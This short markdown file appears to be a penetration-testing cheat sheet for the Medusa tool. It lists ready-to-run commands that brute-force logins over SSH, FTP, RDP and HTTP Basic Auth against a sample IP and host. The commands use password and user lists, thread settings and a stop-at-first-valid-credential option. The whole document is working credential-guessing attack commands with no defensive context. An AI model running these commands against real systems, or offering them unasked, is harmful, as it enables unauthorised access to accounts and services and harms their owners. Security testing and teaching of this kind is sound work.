# tools/medusa.md

## Brute-force with Medusa

### Brute force SSH (single user, password list)
    medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

### Brute force FTP (user list, password list, 5 threads)
    medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5

### Brute force RDP (single user, password list)
    medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp

### Brute force HTTP Basic Auth (GET)
    medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET

### Stop after first valid SSH credential found
    medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
